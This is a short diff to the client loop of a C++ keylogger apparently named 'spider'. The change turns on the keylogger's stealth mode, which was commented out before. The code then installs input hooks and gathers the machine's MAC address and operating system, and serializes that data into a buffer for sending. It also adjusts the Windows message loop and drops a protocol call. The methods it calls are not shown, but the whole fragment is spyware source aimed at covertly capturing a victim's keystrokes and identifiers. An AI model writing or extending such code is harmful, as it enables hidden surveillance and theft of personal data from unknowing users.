@@ -26,7 +26,7 @@ void spider::ClientCore::run()
   bool running;
 
   running = true;
-  //_keylogger->stealth();
+  _keylogger->stealth();
   _keylogger->initHooks();
   _keylogger->getMacAddr();
   _keylogger->getOperatingSystem();
@@ -34,10 +34,11 @@ void spider::ClientCore::run()
   spider::Buffer::BufferInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*(_keylogger->getInfos()))));
   while (running)
   {
-    if (!GetMessage(&msg, NULL, 0, 0))
+    if (!GetMessage(&msg, nullptr, 0, 0))
+    {
       running = false;
+    }
     TranslateMessage(&msg);
     DispatchMessage(&msg);
-    _proto->run();
   }
 }
